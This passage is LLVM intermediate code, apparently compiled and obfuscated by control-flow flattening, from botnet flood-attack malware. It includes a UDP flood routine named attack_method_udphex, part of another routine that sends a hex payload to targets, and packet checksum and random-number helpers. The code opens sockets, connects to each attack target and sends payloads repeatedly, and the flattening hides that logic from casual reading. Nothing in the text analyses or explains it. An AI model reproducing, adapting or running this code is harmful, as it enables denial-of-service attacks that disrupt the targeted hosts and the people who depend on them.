  %131 = select i1 %130, i32 -1554557785, i32 1568497165
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i64 %135
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i32 0, i32 1
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #8
  %140 = call i32 @rand_next()
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = zext i8 %146 to i32
  %148 = lshr i32 %140, %147
  %149 = add i32 %139, %148
  %150 = call i32 @htonl(i32 %149) #8
  %151 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %152 = load i32, i32* %9, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i64 %153
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i32 0, i32 0
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %155, i32 0, i32 2
  %157 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %156, i32 0, i32 0
  store i32 %150, i32* %157, align 4
  store i32 1568497165, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32*, i32** %11, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i32, i32* %159, i64 %161
  %163 = load i32, i32* %162, align 4
  %164 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %165 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 0
  %170 = bitcast %struct.sockaddr_in* %169 to %struct.sockaddr*
  store %struct.sockaddr* %170, %struct.sockaddr** %164, align 8
  %171 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %172 = load %struct.sockaddr*, %struct.sockaddr** %171, align 8
  %173 = call i32 @connect(i32 %163, %struct.sockaddr* %172, i32 16)
  %174 = icmp eq i32 %173, -1
  %175 = select i1 %174, i32 1955301222, i32 783766627
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 783766627, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  store i32 -1974513088, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i32, i32* %9, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %9, align 4
  store i32 -1030779064, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** @hexPayload, align 8
  %183 = call i64 @strlen(i8* %182) #10
  %184 = trunc i64 %183 to i32
  store i32 %184, i32* %22, align 4
  store i32 2060460044, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 319768229, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* %9, align 4
  %188 = load i8, i8* %5, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %187, %189
  %191 = select i1 %190, i32 175038464, i32 1371664659
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i8**, i8*** %10, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i8*, i8** %193, i64 %195
  %197 = load i8*, i8** %196, align 8
  store i8* %197, i8** %23, align 8
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  %200 = select i1 %199, i32 -1466654472, i32 2114208072
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %23, align 8
  %203 = load i16, i16* %14, align 2
  %204 = zext i16 %203 to i32
  call void @rand_str(i8* %202, i32 %204)
  store i32 2114208072, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i32*, i32** %11, align 8
  %207 = load i32, i32* %9, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds i32, i32* %206, i64 %208
  %210 = load i32, i32* %209, align 4
  %211 = load i8*, i8** %23, align 8
  %212 = load i16, i16* %14, align 2
  %213 = zext i16 %212 to i64
  %214 = call i64 @send(i32 %210, i8* %211, i64 %213, i32 16384)
  %215 = load i32*, i32** %11, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i32, i32* %215, i64 %217
  %219 = load i32, i32* %218, align 4
  %220 = load i8*, i8** @hexPayload, align 8
  %221 = load i32, i32* %22, align 4
  %222 = sext i32 %221 to i64
  %223 = call i64 @send(i32 %219, i8* %220, i64 %222, i32 16384)
  store i32 -313572964, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32, i32* %9, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %9, align 4
  store i32 319768229, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  store i32 2060460044, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %227, %224, %205, %201, %192, %186, %185, %181, %178, %177, %176, %158, %132, %122, %121, %103, %94, %85, %76, %66, %60, %59, %56, %53, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udphex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1294)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 12575601, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 12575601, label %first
    i32 -618314335, label %52
    i32 -1542378958, label %55
    i32 -420753233, label %58
    i32 -605531298, label %59
    i32 735261245, label %65
    i32 1033236934, label %75
    i32 -315714502, label %84
    i32 -1527776655, label %93
    i32 19604432, label %101
    i32 1167302244, label %102
    i32 1549222649, label %120
    i32 -1446593961, label %121
    i32 1190298443, label %131
    i32 -1006246460, label %157
    i32 103595530, label %175
    i32 -1662793404, label %176
    i32 897744613, label %177
    i32 -825636779, label %180
    i32 -1768559747, label %181
    i32 -79790899, label %182
    i32 1902583185, label %188
    i32 -1470480019, label %197
    i32 -1662256495, label %201
    i32 -567562989, label %208
    i32 325380703, label %211
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 -618314335, i32 -1542378958
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 -420753233, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #8
  store i16 %57, i16* %13, align 2
  store i32 -420753233, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -605531298, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 735261245, i32 -825636779
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 1033236934, i32 -315714502
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 -1527776655, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #8
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 -1527776655, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 19604432, i32 1167302244
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #7
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 1549222649, i32 -1446593961
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -1446593961, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 1190298443, i32 -1006246460
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #8
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #8
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -1006246460, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 103595530, i32 -1662793404
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -1662793404, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 897744613, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 -605531298, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -1768559747, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -79790899, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 1902583185, i32 325380703
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 -1470480019, i32 -1662256495
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 -1662256495, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = call i64 @send(i32 %206, i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i32 0, i32 0), i64 1458, i32 16384)
  store i32 -567562989, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %9, align 4
  store i32 -79790899, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  store i32 -1768559747, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %211, %208, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 1260033464, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1260033464, label %6
    i32 -1784463787, label %10
    i32 2095840530, label %17
    i32 1565813247, label %20
    i32 1220991692, label %24
    i32 -267132670, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  %9 = select i1 %8, i32 -1784463787, i32 1565813247
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  store i32 2095840530, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 2
  store i32 %19, i32* %4, align 4
  store i32 1260033464, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, 1
  %23 = select i1 %22, i32 1220991692, i32 -267132670
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i16*, i16** %3, align 8
  %26 = load i16, i16* %25, align 2
  %27 = trunc i16 %26 to i8
  %28 = sext i8 %27 to i64
  %29 = load i64, i64* %5, align 8
  %30 = add i64 %29, %28
  store i64 %30, i64* %5, align 8
  store i32 -267132670, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = add i64 %33, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = add i64 %39, %38
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = trunc i64 %42 to i16
  ret i16 %43

loopEnd:                                          ; preds = %24, %20, %17, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 2129571753, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2129571753, label %23
    i32 -24364251, label %27
    i32 1092302352, label %37
    i32 2027200892, label %41
    i32 -253062329, label %48
    i32 -1623940446, label %79
    i32 -431779175, label %84
    i32 527831972, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 -24364251, i32 1092302352
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 2129571753, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 2027200892, i32 -253062329
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 -253062329, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #8
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 -1623940446, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -431779175, i32 527831972
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 -1623940446, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
